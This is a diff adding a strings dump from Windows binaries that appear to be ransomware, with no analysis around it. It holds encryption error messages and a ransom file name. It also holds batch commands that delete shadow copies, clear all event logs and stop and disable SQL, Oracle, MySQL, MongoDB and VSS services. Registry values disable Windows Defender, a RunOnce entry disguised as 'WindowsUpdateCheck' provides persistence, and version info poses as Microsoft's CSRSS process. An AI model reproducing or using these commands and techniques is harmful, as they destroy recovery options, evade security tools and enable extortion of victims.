@@ -1,0 +1,944 @@
+!This program cannot be run in DOS mode.
+`.rdata
+@.data
+@.reloc
+D$(+D$
+t-_^[]
+t-_^[]
+)D$ vl
+FFFFFFFFFFF
+@@@@@@@@@@
+@@@@@@@@@
+@@@@@@@@
+@@@@@@@
+@@@@@@
+FFFFFFFFFFF
+@@@@@@@@@@
+@@@@@@@@@
+@@@@@@@@
+@@@@@@@
+@@@@@@
+FFFFFFFFFFF
+@@@@@@@@@@
+@@@@@@@@@
+@@@@@@@@
+@@@@@@@
+@@@@@@
+FFFFFFFFFFF
+@@@@@@@@@@
+@@@@@@@@@
+@@@@@@@@
+@@@@@@@
+@@@@@@
+D$,vT2
+LSVj@3
+L$L3L$D#L$<3L$L
+L$ 1T$
+T$ #T$0
+L$D3L$<#L$43L$D
+T$ #T$(
+3D$8#L$,#D$03D$@3L$<
+T$H1t$D3
+t$L#L$L#t$
+D$83D$03
+L$43L$,#L$$3L$4
+D$D1t$<
+T$H#L$D#t$
+L$,3L$$#L$
+t$<#t$L
+T$@#T$
+L$$3L$
+T$01t$,3
+t$4#L$4#t$D
+T$8#T$H
+#L$L3L$
+3D$ #D$
+T$(1t$$3
+t$,#L$,
+T$0#t$<#T$@
+3L$L#L$D3L$
+L$(1T$ 3
+D$$1t$
+T$(#L$$#D$(#t$4#T$8
+D$T_^[
+PWWWWWWWWj
+PWWWWWWh 
+PVhL6C
+PVh(6C
+PVh|5C
+PVhT5C
+D$$9D$(
+tAh|=C
+t/hH;B
+URPQQh
+;t$,v-
+UQPXY]Y[
+^$+^8+
+u&97t"
+QSSSSj
+t#VhTFB
+Wj0XPV
+TVh SB
+WWWPWS
+u-PWWS
+SSVWh 
+f9:t!V
+|VWj=S
+QQSWj0j@
+35|LC
+PPPPPWS
+PP9E u:PPVWP
+emRoSPf
+PPPPPPPP
+VC20XC00U
+t%hH;B
+FlsAlloc
+FlsFree
+FlsSetValue
+InitializeCriticalSectionEx
+__based(
+__cdecl
+__pascal
+__stdcall
+__thiscall
+__fastcall
+__vectorcall
+__clrcall
+__eabi
+__swift_1
+__swift_2
+__ptr64
+__restrict
+__unaligned
+restrict(
+ delete
+operator
+`vftable'
+`vbtable'
+`vcall'
+`typeof'
+`local static guard'
+`string'
+`vbase destructor'
+`vector deleting destructor'
+`default constructor closure'
+`scalar deleting destructor'
+`vector constructor iterator'
+`vector destructor iterator'
+`vector vbase constructor iterator'
+`virtual displacement map'
+`eh vector constructor iterator'
+`eh vector destructor iterator'
+`eh vector vbase constructor iterator'
+`copy constructor closure'
+`udt returning'
+`local vftable'
+`local vftable constructor closure'
+ new[]
+ delete[]
+`omni callsig'
+`placement delete closure'
+`placement delete[] closure'
+`managed vector constructor iterator'
+`managed vector destructor iterator'
+`eh vector copy constructor iterator'
+`eh vector vbase copy constructor iterator'
+`dynamic initializer for '
+`dynamic atexit destructor for '
+`vector copy constructor iterator'
+`vector vbase copy constructor iterator'
+`managed vector copy constructor iterator'
+`local static thread guard'
+operator "" 
+operator co_await
+ Type Descriptor'
+ Base Class Descriptor at (
+ Base Class Array'
+ Class Hierarchy Descriptor'
+ Complete Object Locator'
+`h`hhh
+xwpwpp
+(null)
+[aOni*{
+~ $s%r
+@b;zO]
+v2!L.2
+;COMSPEC
+cmd.exe
+CorExitProcess
+NAN(SNAN)
+nan(snan)
+NAN(IND)
+nan(ind)
+Sunday
+Monday
+Tuesday
+Wednesday
+Thursday
+Friday
+Saturday
+January
+February
+August
+September
+October
+November
+December
+MM/dd/yy
+dddd, MMMM dd, yyyy
+HH:mm:ss
+AreFileApisANSI
+CompareStringEx
+FlsAlloc
+FlsFree
+FlsGetValue
+FlsSetValue
+GetCurrentPackageId
+InitializeCriticalSectionEx
+LCMapStringEx
+LocaleNameToLCID
+ !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
+1#QNAN
+1#SNAN
+?5Wg4p
+%S#[k=
+"B <1=
+_hypot
+_nextafter
+ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
+D7q/;M
+Dl0123456789ABCDEF
+!This program cannot be run in DOS mode.
+`.rdata
+@.data
+@.reloc
+u_hpu@
+ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/H
+GT#F4>
+i1:HA$
+3#x;b<u
+^.;sg;
+}q#yhb
+:6hQsw
+y >/Zl
+O%$g{F
+o#bJPA
+/P4L?T
+jE^`v:
+ftzX`X
+0i*E"^6
+iXq`.xR
+@fLx^o>
+aCYX|3R
+r3<:7t
+Bo"SVS
+#FG$q-
+xiDo~{
+^d}t7#
+_$gc0Q
+Zb0+h"!.
+Wop\|Cr
+)S]Cpe7
+{[}In%
+6c7i+l
+#|6d16_
+~BjDPR
+_"^pO<T
+ZF6vw.(w2
+I>-%%s
+ULR'\R
+s<m/Tvh
+I>NQ~A
+6QY?8h
+}BmY9W1
+F5N9b=
+ljy%'v?j6!W#~J[&K^b&l+'!?Mg7L3>GQsBU^gSIdlKOg~t0q8V*hXCa]%M0jbeR
+.text$mn
+.idata$5
+.rdata
+.rdata$zzzdbg
+.idata$2
+.idata$3
+.idata$4
+.idata$6
+.CRT$XCA
+.CRT$XCZ
+.rsrc$01
+.rsrc$02
+lstrlenW
+lstrlenA
+MultiByteToWideChar
+lstrcatW
+GlobalAlloc
+GlobalFree
+lstrcpyW
+HeapAlloc
+GetProcessHeap
+HeapFree
+ExitProcess
+GetModuleHandleA
+GetStartupInfoA
+GetCommandLineA
+KERNEL32.dll
+UpdateWindow
+PostQuitMessage
+GetClientRect
+SetWindowLongW
+TranslateMessage
+DispatchMessageW
+ShowWindow
+RegisterClassExW
+GetSystemMetrics
+CreateWindowExW
+DefWindowProcW
+GetMessageW
+GetWindowLongW
+USER32.dll
+OleUninitialize
+OleSetContainedObject
+OleCreate
+OleInitialize
+ole32.dll
+OLEAUT32.dll
+<?xml version='1.0' encoding='UTF-8' standalone='yes'?>
+<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>
+  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
+    <security>
+      <requestedPrivileges>
+        <requestedExecutionLevel level='asInvoker' uiAccess='false' />
+      </requestedPrivileges>
+    </security>
+  </trustInfo>
+</assembly>
+1>1J1Q1Z1
+444Q4_4i4z4
+5"5'5-545:5Q5\5m5x5
+656@6L6
+8#8A8k8w8
+9%9/9<9G9[9
+1 1$1(1,1014181<1@1D1H1L1P1T1X1\1`1d1h1l1p1t1x1|1
+@y,~j9
+.text$mn
+.idata$5
+.00cfg
+.CRT$XCA
+.CRT$XCAA
+.CRT$XCZ
+.CRT$XIA
+.CRT$XIAA
+.CRT$XIAC
+.CRT$XIC
+.CRT$XIZ
+.CRT$XPA
+.CRT$XPX
+.CRT$XPXA
+.CRT$XPZ
+.CRT$XTA
+.CRT$XTZ
+.rdata
+.rdata$sxdata
+.rdata$zzzdbg
+.rtc$IAA
+.rtc$IZZ
+.rtc$TAA
+.rtc$TZZ
+.xdata$x
+.idata$2
+.idata$3
+.idata$4
+.idata$6
+.rsrc$01
+.rsrc$02
+QueryPerformanceCounter
+ReadFile
+lstrlenW
+lstrcpynW
+lstrlenA
+CreateFileW
+UnmapViewOfFile
+InterlockedFlushSList
+CloseHandle
+CreateFileMappingW
+InterlockedPushEntrySList
+MapViewOfFile
+InitializeSListHead
+InterlockedPopEntrySList
+lstrcpyW
+LocalFree
+GetFileSizeEx
+SetEndOfFile
+GetLastError
+SetFilePointerEx
+MoveFileExW
+GlobalAlloc
+GlobalFree
+FindFirstFileW
+FindFirstVolumeW
+SetPriorityClass
+GetCommandLineW
+FindNextFileW
+GetCurrentProcess
+WaitForMultipleObjects
+GetEnvironmentVariableW
+FindClose
+CreateMutexA
+WaitForSingleObject
+GetFileAttributesW
+ReleaseMutex
+lstrcatA
+SetFileAttributesW
+GetLogicalDriveStringsW
+lstrcatW
+GetSystemInfo
+CreateThread
+SetVolumeMountPointW
+FindVolumeClose
+CreateProcessW
+CopyFileW
+GetVolumePathNamesForVolumeNameW
+FindNextVolumeW
+lstrcmpiW
+GetDriveTypeW
+GetExitCodeProcess
+EnterCriticalSection
+WriteFile
+InitializeCriticalSectionAndSpinCount
+LeaveCriticalSection
+SetFilePointer
+DeleteCriticalSection
+lstrcpynA
+GetComputerNameW
+GetSystemTime
+KERNEL32.dll
+wsprintfW
+wsprintfA
+USER32.dll
+CryptReleaseContext
+CryptGenRandom
+CryptAcquireContextW
+FreeSid
+SetNamedSecurityInfoW
+SetEntriesInAclW
+AllocateAndInitializeSid
+OpenProcessToken
+AdjustTokenPrivileges
+LookupPrivilegeValueW
+RegOpenKeyW
+RegDeleteValueW
+RegCreateKeyW
+RegSetValueExW
+RegCloseKey
+ADVAPI32.dll
+SHChangeNotify
+CommandLineToArgvW
+ShellExecuteExW
+SHELL32.dll
+WNetCloseEnum
+WNetEnumResourceW
+WNetOpenEnumW
+MPR.dll
+GetCurrentProcessId
+GetCurrentThreadId
+GetSystemTimeAsFileTime
+IsDebuggerPresent
+UnhandledExceptionFilter
+SetUnhandledExceptionFilter
+GetStartupInfoW
+IsProcessorFeaturePresent
+GetModuleHandleW
+TerminateProcess
+RtlUnwind
+SetLastError
+TlsAlloc
+TlsGetValue
+TlsSetValue
+TlsFree
+FreeLibrary
+GetProcAddress
+LoadLibraryExW
+RaiseException
+GetModuleHandleExW
+GetStdHandle
+GetModuleFileNameA
+MultiByteToWideChar
+WideCharToMultiByte
+ExitProcess
+GetACP
+HeapAlloc
+HeapFree
+GetFileType
+CompareStringW
+LCMapStringW
+HeapReAlloc
+HeapSize
+GetStringTypeW
+CreateProcessA
+GetFileAttributesExW
+FindFirstFileExA
+FindNextFileA
+IsValidCodePage
+GetOEMCP
+GetCPInfo
+GetCommandLineA
+GetEnvironmentStringsW
+FreeEnvironmentStringsW
+SetEnvironmentVariableA
+SetStdHandle
+GetProcessHeap
+FlushFileBuffers
+GetConsoleCP
+GetConsoleMode
+WriteConsoleW
+DecodePointer
+VirtualQuery
+                          
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+                          
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+SHA224
+SHA256
+SHA384
+SHA512
+md5WithRSAEncryption
+RSA with MD5
+sha224WithRSAEncryption
+RSA with SHA-224
+sha256WithRSAEncryption
+RSA with SHA-256
+sha384WithRSAEncryption
+RSA with SHA-384
+sha512WithRSAEncryption
+RSA with SHA-512
+RSASSA-PSS
+RSASSA-PSS
+rsaEncryption
+id-ecPublicKey
+Generic EC key
+id-ecDH
+EC key for ECDH
+id-md5
+id-sha224
+SHA-224
+id-sha256
+SHA-256
+id-sha384
+SHA-384
+id-sha512
+SHA-512
+hmacSHA224
+HMAC-SHA-224
+hmacSHA256
+HMAC-SHA-256
+hmacSHA384
+HMAC-SHA-384
+hmacSHA512
+HMAC-SHA-512
+[ERROR] %S MapViewOfFile error %i
+[ERROR] %S CreateFileMapping error %i
+[ERROR] %S NOT ENOUGH RAM TO ECRYPT FILE!
+[ERROR] %S CreateFile error %i
+[ERROR] %S CreateFile TakeOwnership error %i
+[ERROR] %S CreateFile error %i
+[ERROR] %S MoveFileEx error %i
+[ERROR] %S MoveFileEx TakeOwnership error %i
+[ERROR] %S MoveFileEx error %i
+@echo off
+vssadmin Delete Shadows /all /quiet
+reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f
+reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /f
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"
+for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil cl "%1"
+@echo off
+vssadmin delete shadows /all /quiet
+sc config browser
+sc config browser start=enabled
+sc stop vss
+sc config vss start=disabled
+sc stop MongoDB
+sc config MongoDB start=disabled
+sc stop SQLWriter
+sc config SQLWriter start=disabled
+sc stop MSSQLServerOLAPService
+sc config MSSQLServerOLAPService start=disabled
+sc stop MSSQLSERVER
+sc config MSSQLSERVER start=disabled
+sc stop MSSQL$SQLEXPRESS
+sc config MSSQL$SQLEXPRESS start=disabled
+sc stop ReportServer
+sc config ReportServer start=disabled
+sc stop OracleServiceORCL
+sc config OracleServiceORCL start=disabled
+sc stop OracleDBConsoleorcl
+sc config OracleDBConsoleorcl start=disabled
+sc stop OracleMTSRecoveryService
+sc config OracleMTSRecoveryService start=disabled
+sc stop OracleVssWriterORCL
+sc config OracleVssWriterORCL start=disabled
+sc stop MySQL
+sc config MySQL start=disabled
+[ERROR] %S FindFirstFile error %i
+[ERROR] %S TakeOwnership error %i
+[ERROR] %S FindFirstFile TakeOwnership error %i
+Global\
+settings signature not found
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!-- Copyright (c) Microsoft Corporation -->
+<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
+<assemblyIdentity
+    version="5.1.0.0"
+    name="Microsoft.Windows.CSRSS"
+<description>Client Server Runtime Process</description>
+<trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
+    <security>
+        <requestedPrivileges>
+            <requestedExecutionLevel
+                level="asInvoker"
+                uiAccess="false"
+            />
+        </requestedPrivileges>
+    </security>
+</trustInfo>
+</assembly>
+H0m0z0
+181B1L1V1]1
+2.3=3Q3h3u3
+4(4?4N4~4
+5%5V5h5x5
+5#676L6`6
+7+7@7Q7
+8&898K8
+9*9k9z9
+::.:i:v:
+;!;,;f;u;
+=(=;=N=X=
+>,>A>K>s>}>
+?A?P?d?x?
+0-0=0H0n0|0
+1"1V1g1z1
+353<3I3V3o3v3
+4(4/4J4T4^4y4
+5 5>5H5Z5d5n5
+6%676R6a6y6
+444W4z4
+>!?J?p?
+7%8K8q8
+0,1a1|1
+7H7R7X7d7j7
+8$8/8:8D8I8O8W8]8i8{8
+<N<k<z<
+4"4(4044484<4@4D4}4
+0\156[6
+; ;$;(;,;0;
+N1q1B3
+6+828{9
+<"<k=r=
+8K9X9k9w9
+: :C:O:\:l:s:
+;X<h<r<
+1151:1S1l1
+2,2A2V2k2w2
+4$5J5Z5
+626<6W6j6
+7G8N8]8u8
+9"979j9
+:5:?:{:
+:6;n;x;
+<)<p<{<
+<.=4=9=F=M=g=
+>*>?>I>S>`>y>
+0H0N0[0h0z0
+1-12191?1K1P1^1c1q1v1}1
+2,2?2Y2l2
+3'323?3H3Q3
+5#545E5T5u5{5
+6!6&6,63686@6D6J6N6T6X6^6b6k6q6}6
+7#7(787N7n7t7
+8!8*8_8e8k8{8
+949>9C9W9l9x9
+:I:[:p:w:
+<5<:<G<
+=!>G>V>i>u>
+0 060p0y0
+3 3A3^3
+3h4q4y4
+5 5)565@5V5_5j5q5
+6"6,6<6L6\6e6
+9E<Q<n=u=
+>)>D>U>a>}>
+?2?H?n?
+0&030<0A0F0a0k0w0|0
+1+1=1I1S1X1l1u1
+;+<0<4<8<<<
+979F9T9`9l9z9
+:(:>:R:a:v:
+>(>0>H>m>
+>,?5?n?y?
+445d5s5
+88%898E8
+=0=c=r=w=
+4 4S4e4
+89<:X:
+171H1c1o1
+2+2<2Q2[2~2
+?H?X?o?w?
+00$0)0A0b0
+1,171<1A1\1f1
+212<2A2F2g2w2
+3&3+303N3q3|3
+4*4<4H4z4
+6#696F6K6Y6;7Z7_7Q8
+>">->^>
+6!7H7Q8
+989B9S9X9m9
+==*=>=I=`=
+=(>^>q>
+L0Q0W0\0
+1\1h1|1
+646<6e6l6
+8$868H8Z8l8~8
+=!>7>X>
+>_?f?p?
+0$0Q0c0
+75?5v5}5
++02090@0
+>?>\>~>
+1-3U5_7l7
+:0;a;\>b>o>z>
+>3?E?W?
+1'141d1
+:!:):G:O:
+1L2W2b2h2q2
+3.3M3x3
+4#5)5.545E5
+:$:::B:
+>.>:>A>S>o>
+<2D2P2T2X2\2`2l2p2t2
+4 4$4(4,4044484<4@4D4H4L4P4T4X4\4`4d4h4l4p4t4x4|4
+5 5$5(5,5054585<5@5D5H5H;
+h6p6x6|6
+< <$<(<,<0<4<8<<<@<D<H<L<P<T<X<\<`<d<h<l<p<t<x<|<
+= =$=(=,=0=4=8=<=@=D=H=L=P=X=\=`=d=h=l=p=t=x=|=
+:$:,:4:<:D:L:T:\:d:l:t:|:
+;$;,;4;<;D;L;T;\;d;l;t;|;
+<$<,<4<<<D<L<T<\<d<l<t<|<
+=$=,=4=<=D=L=T=\=d=l=t=|=
+>$>,>4><>D>L>T>\>d>l>t>|>
+?$?,?4?<?D?L?T?\?d?l?t?|?
+0$0,040<0D0L0T0\0d0l0t0|0
+1$1,1418;@;H;P;X;`;h;p;x;
+< <(<0<8<@<H<P<X<`<h<p<x<
+= =(=0=8=@=H=P=X=`=h=p=x=
+> >(>0>8>@>H>P>X>`>h>p>x>
+? ?(?0?8?@?H?P?X?`?h?p?x?
+0 0(00080@0H0P0X0`0h0p0x0
+1 1(10181@1H1P1X1`1h1p1x1
+2 2(20282@2H2P2Z<^<b<f<
+6$6,646<6D6L6T6\6d6l6t6|6
+: :$:(:,:4:@:D:H:L:P:T:X:\:d:p:t:x:|:
+; ;$;,;4;8;@;H;L;h;p;t;
+<$<,<0<8<@<D<`<h<l<t<|<
+1 1$1(1,1014181<1@1D1H1L1P1T1X1\1`1d1h1l1p1t1x1|1
+2 2$2(2,2024282<2@2D2H2L2P2T2X2\2`2d2h2l2p2t2x2|2
+3 3$3(3,3034383<3@3D3H3L3P3T3X3\3`3d3h3l3p3t3x3|3
+d6h6p6
+: :@:H:L:h:
+;(;H;h;
+<0<P<p<
+=0=L=P=p=
+101@1P1`1p1
+7 7$7(7,7074787<7
+jjjjjj
+Bapi-ms-win-core-fibers-l1-1-1
+api-ms-win-core-synch-l1-2-0
+kernel32
+api-ms-
+ext-ms-
+(null)
+mscoree.dll
+Sunday
+Monday
+Tuesday
+Wednesday
+Thursday
+Friday
+Saturday
+January
+February
+August
+September
+October
+November
+December
+MM/dd/yy
+dddd, MMMM dd, yyyy
+HH:mm:ss
+Bapi-ms-win-appmodel-runtime-l1-1-1
+api-ms-win-core-datetime-l1-1-1
+api-ms-win-core-fibers-l1-1-1
+api-ms-win-core-file-l2-1-1
+api-ms-win-core-localization-l1-2-1
+api-ms-win-core-localization-obsolete-l1-2-0
+api-ms-win-core-processthreads-l1-1-2
+api-ms-win-core-string-l1-1-0
+api-ms-win-core-synch-l1-2-0
+api-ms-win-core-sysinfo-l1-2-1
+api-ms-win-core-winrt-l1-1-0
+api-ms-win-core-xstate-l2-1-0
+api-ms-win-rtcore-ntuser-window-l1-1-0
+api-ms-win-security-systemfunctions-l1-1-0
+ext-ms-win-kernel32-package-current-l1-1-0
+ext-ms-win-ntuser-dialogbox-l1-1-0
+ext-ms-win-ntuser-windowstation-l1-1-0
+advapi32
+kernel32
+user32
+         (((((                  H
+Bja-JP
+zh-CHS
+az-AZ-Latn
+uz-UZ-Latn
+kok-IN
+syr-SY
+div-MV
+quz-BO
+sr-SP-Latn
+az-AZ-Cyrl
+uz-UZ-Cyrl
+quz-EC
+sr-SP-Cyrl
+quz-PE
+smj-NO
+bs-BA-Latn
+smj-SE
+sr-BA-Latn
+sma-NO
+sr-BA-Cyrl
+sma-SE
+sms-FI
+smn-FI
+zh-CHT
+az-az-cyrl
+az-az-latn
+bs-ba-latn
+div-mv
+kok-in
+quz-bo
+quz-ec
+quz-pe
+sma-no
+sma-se
+smj-no
+smj-se
+smn-fi
+sms-fi
+sr-ba-cyrl
+sr-ba-latn
+sr-sp-cyrl
+sr-sp-latn
+syr-sy
+uz-uz-cyrl
+uz-uz-latn
+zh-chs
+zh-cht
+CONOUT$
+charlie.j0hnson
+HOW TO RETURN YOU FILES.exe
+about:blank
+My Host Name
+{{ID}}
+Requirements
+windows
+bootmgr
+pagefile.sys
+ids.txt
+NTDETECT.COM
+MSDOS.SYS
+IO.SYS
+CONFIG.SYS
+ntuser.dat
+perflogs
+$Recycle.Bin
+Bootfont.bin
+boot.ini
+AUTOEXEC.BAT
+.sqlite
+.sqlite3
+.sqlitedb
+.accdb
+.accdc
+.accde
+.accdr
+.accdt
+.accdw
+.accft
+.dacpac
+.dadiagrams
+.daschema
+.db-journal
+.db-shm
+.db-wal
+.flexolibrary
+.fmp12
+.fmpsl
+.kexic
+.kexis
+.marshal
+.mdbhtml
+.nrmlib
+.sas7bdat
+.teacher
+.xmlff
+VBOXSVR
+tsclient
+SYSVOL
+ > nul
+/c del 
+COMSPEC
+SeTakeOwnershipPrivilege
+SeManageVolumePrivilege
+SeRestorePrivilege
+SeBackupPrivilege
+\WindowsUpdateCheck
+Software\Microsoft\Windows\CurrentVersion\RunOnce
+WindowsUpdateCheck
+Software\Microsoft\Windows\CurrentVersion\RunOnce
+DisableOnAccessProtection
+DisableBehaviorMonitoring
+DisableRealtimeMonitoring
+SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection
+SOFTWARE\Policies\Microsoft\Windows Defender\Policy Manager
+DisableAntiSpyware
+SOFTWARE\Policies\Microsoft\Windows Defender
+DisableHomeGroup
+SOFTWARE\Policies\Microsoft\Windows\HomeGroup
+MaxIdleTime
+MaxDisconnectionTime
+SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services
+allusersprofile
+ids.txt
+VS_VERSION_INFO
+StringFileInfo
+040904B0
+CompanyName
+Microsoft Corporation
+FileDescription
+Client Server Runtime Process
+FileVersion
+10.0.18362.1 (WinBuild.160101.0800)
+InternalName
+CSRSS.Exe
+LegalCopyright
+ Microsoft Corporation. All rights reserved.
+OriginalFilename
+CSRSS.Exe
+ProductName
+Microsoft
+ Windows
+ Operating System
+ProductVersion
+10.0.18362.1
+VarFileInfo
+Translation
